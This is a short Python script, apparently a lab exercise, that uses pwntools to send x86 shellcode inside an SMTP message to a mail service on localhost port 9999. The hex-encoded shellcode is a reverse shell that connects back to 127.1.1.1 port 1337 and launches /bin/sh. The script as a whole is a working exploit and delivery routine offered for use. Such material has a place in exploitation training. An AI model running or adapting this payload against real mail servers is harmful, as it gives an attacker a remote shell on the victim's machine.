from pwn import *

#pritf "\x6a\x66..." > shellcode
shellcode = '\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' 

with open('shellcode') as f:
	shellMessage = f.read()

maliciousMail = shellMessage + '\r\n.\r\n' #shellcode

def sendMessage(connection, message):
	connection.sendline('HELO') 
	sleep(1)	
	connection.sendline('MAIL FROM:<bill@localhost.com>')
	sleep(1)
	connection.sendline('RCPT TO:<alice@localhost.com>')
	sleep(1)
	connection.sendline('DATA')
	sleep(1)
	connection.write(message)
	sleep(1)
	connection.write('\r\n.\r\n')
	sleep(1)
	connection.sendline('QUIT')
	sleep(1)

p = connect('localhost', 9999)
sleep(3)
sendMessage(p, maliciousMail)
sleep(1)
sleep(0)

	

